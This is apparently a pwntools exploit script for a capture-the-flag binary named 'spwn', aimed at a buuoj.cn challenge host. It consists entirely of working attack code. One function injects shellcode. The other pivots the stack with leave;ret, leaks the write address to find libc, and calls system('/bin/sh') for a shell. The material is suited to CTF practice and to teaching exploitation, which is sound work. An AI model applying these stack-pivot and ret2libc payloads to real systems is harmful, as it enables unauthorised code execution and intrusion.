from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='i386', os='linux')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn', 26155)
else:
  conn = process(sys.argv[0][:-7])
  #gdb.attach(conn, 'b *0x8048524')

def exp1():
    name_addr = 0x804a300
    leave_ret = 0x08048511
    ret = 0x08048512

    conn.recvuntil(b'name?')
    payload1 = asm(shellcraft.sh())
    conn.sendline(payload1)

    conn.recvuntil(b'say?')
    payload2 = cyclic(0x18+0x4) + p32(name_addr) 
    conn.sendline(payload2)
    conn.interactive()

def exp2():
    elf = ELF('./spwn')
    puts_plt = elf.plt['puts']
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    name_addr = 0x804a300
    main = 0x08048513
    leave_ret = 0x08048511
    ret = 0x08048512

    conn.recvuntil(b'name?')
    payload1 = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(0x4)
    conn.send(payload1)

    conn.recvuntil(b'say?')
    payload2 = cyclic(0x18) + p32(name_addr - 0x4)  + p32(leave_ret) 
    conn.send(payload2)
    
    leak_addr = u32(conn.recv(4))
    libc = LibcSearcher('write', leak_addr)
    libc_base = leak_addr - libc.dump('write')
    system = libc_base + libc.dump('system')
    binsh = libc_base + libc.dump('str_bin_sh')
    
    conn.recvuntil(b'name?')
    payload = p32(system) + p32(0) + p32(binsh) + p32(0) * 2
    conn.send(payload)

    
    conn.recvuntil(b'say?')
    payload2 = cyclic(0x18) + p32(name_addr - 0x4)  + p32(leave_ret) 
    conn.send(payload2)
    conn.interactive()

exp2()

